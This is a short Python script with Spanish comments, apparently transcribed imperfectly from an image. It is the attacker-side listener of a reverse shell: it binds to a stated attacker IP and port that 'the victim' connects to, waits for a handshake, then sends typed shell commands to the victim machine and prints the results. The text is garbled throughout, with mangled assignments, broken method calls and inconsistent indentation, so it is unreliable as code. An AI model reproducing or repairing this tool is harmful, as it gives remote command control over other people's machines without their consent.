
import socket
server-socket.socket()
server.bind(('192.168.136.133',8080)) # Aqui ponemos la IP de nuestra máquina atacante dondo 30 conoctará la victima.
server.listen(1)
while True:
  victima, direccion=server.accept()
    print( 'Conexion de: {Y format(direccion))
    msj8inario-victima. recv(1024)
    ms sjCodificado-msjBinario.decode("ascii")
    if msjCodificado = "1":
      while True:
          opcion = input("shell@shell: ")
          victima.sendopcion.encode("ascii"))
          resultado=victima.recv(2048)
          print(resultado)
  else:
      print("Error")
      break
